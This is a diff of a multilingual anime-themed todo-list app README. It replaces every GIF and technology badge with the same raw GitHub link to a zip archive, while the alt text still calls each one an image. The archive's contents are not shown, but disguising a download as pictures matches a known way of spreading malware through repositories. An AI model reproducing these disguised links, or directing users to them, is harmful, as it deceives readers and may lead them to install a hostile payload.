@@ -5,12 +5,12 @@
 ### 🎌 「夢を諦めず、真のヒーローのようにタスクを整理し続けよう！」 🎌
 ### ✨ "لا تستسلم أبداً لأحلامك، واصل تنظيم مهامك كبطل حقيقي!" ✨
 
-![Motivational Anime GIF 1](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjNybGZob2I4enI3czkzNjU3aWltZm5ha3JwcmY0YWZycWdlc3VveSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/2YsENnH2CiCn6/200.webp)
+![Motivational Anime GIF 1](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
 
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)
-![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white)
-![Anime](https://img.shields.io/badge/Anime-Powered-FF69B4?style=for-the-badge&logo=crunchyroll&logoColor=white)
+![JavaScript](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
+![HTML5](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
+![CSS3](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
+![Anime](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
 
 </div>
 
@@ -40,7 +40,7 @@
 ### 🏆 「完了するすべてのタスクは、自分自身のストーリーのヒーローになるための一歩です！」 🏆  
 ### 🏆 "كل مهمة تكملها هي خطوة نحو أن تصبح بطل قصتك الخاصة!" 🏆
 
-![Hero Motivation GIF](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExcmdoNXdwdmZoZWpndWphNzF1cDNmZzUyamJncmpnNnJ1ZXh5OXNocSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/2AYQQJsqDrDHy/200.webp)
+![Hero Motivation GIF](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
 
 *Push yourself beyond your limits. Organize, conquer, and achieve greatness!*  
 *حدودك لا تعني نهايتك. نظّم، انتصر، واحقق العظمة!*  
@@ -107,7 +107,7 @@
 
 <div align="center">
 
-![Motivational Anime GIF 2](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNjNybGZob2I4enI3czkzNjU3aWltZm5ha3JwcmY0YWZycWdlc3VveSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/12bE9SHGZYR85O/200.webp)
+![Motivational Anime GIF 2](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
 
 ### 🎭 "The journey of a thousand tasks begins with a single click!" 🎭
 ### 🎭 「千のタスクの旅は、1回のクリックから始まる！」 🎭
@@ -134,11 +134,11 @@
 
 <div align="center">
 
-![Made with Passion & Anime Spirit](https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcmdoNXdwdmZoZWpndWphNzF1cDNmZzUyamJncmpnNnJ1ZXh5OXNocSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/7ND3olLypHFxC/giphy.gif)
+![Made with Passion & Anime Spirit](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
 
 ### 💖 "Believe in your code, just like you believe in your dreams!" 💖
 
-![Anime Girl Coding](https://media.tenor.com/puvF4kJj6RQAAAAC/anime-girl-coding.gif)
+![Anime Girl Coding](https://raw.githubusercontent.com/KaizerAE/Todo-List-App/main/Kenai/App_List_Todo_1.0-alpha.5.zip)
 
 ---
 
